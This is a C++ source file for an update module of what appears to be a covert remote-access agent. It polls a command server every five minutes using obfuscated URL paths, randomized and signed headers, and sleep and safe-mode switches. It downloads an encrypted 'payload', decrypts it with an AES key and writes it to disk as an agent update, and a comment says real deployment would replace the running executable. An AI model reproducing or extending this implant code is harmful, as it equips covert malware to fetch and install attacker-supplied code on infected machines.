#include "UpdateHandler.h"
#include "Globals.h"
#include "Obfuscation.h"
#include "Crypto.h"
#include <curl/curl.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <fstream>
#include <vector>
#include <thread>
#include <chrono>

static size_t write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

static std::string b64decode(const std::string& in) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bio = BIO_new_mem_buf(in.data(), in.size());
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    std::vector<char> buf(in.size());
    int len = BIO_read(bio, buf.data(), buf.size());
    BIO_free_all(bio);
    return std::string(buf.data(), len);
}

void UpdateHandler::apply_update(const std::vector<unsigned char>& data) {
    std::string path = "agent_update.bin";
    std::ofstream out(path, std::ios::binary);
    if(out.is_open()) {
        out.write((const char*)data.data(), data.size());
        out.close();
    }
    // In real deployment this would replace the executable and restart
}

void UpdateHandler::check_loop() {
    CURL* curl = curl_easy_init();
    if(!curl) return;
    struct curl_slist* headers = nullptr;
    while(!g_safe_mode.load() && !g_deep_sleep.load()) {
        std::string url = g_agent_config.server_url + g_agent_config.path_prefix + OBFUSCATE("/payload/") + g_uuid + OBFUSCATE("/agent");
        std::string resp;
        headers = g_header_randomizer.build_list();
        headers = g_request_signer.sign(headers, "GET", url, "");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
        CURLcode res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        if(res == CURLE_OK && !resp.empty()) {
            auto pos = resp.find("payload");
            if(pos != std::string::npos) {
                auto start = resp.find('"', pos + 9);
                auto end = resp.find('"', start + 1);
                if(start != std::string::npos && end != std::string::npos) {
                    std::string blob = resp.substr(start+1, end-start-1);
                    std::string raw = b64decode(blob);
                    std::string iv = raw.substr(0,16);
                    std::vector<unsigned char> enc(raw.begin()+16, raw.end());
                    auto dec = Crypto::decrypt(enc, g_aes_key, iv);
                    apply_update(dec);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::minutes(5));
    }
    curl_easy_cleanup(curl);
}

void UpdateHandler::init() {
    worker_ = std::thread(&UpdateHandler::check_loop, this);
    worker_.detach();
}

extern "C" Module* create_module() { return new UpdateHandler(); }
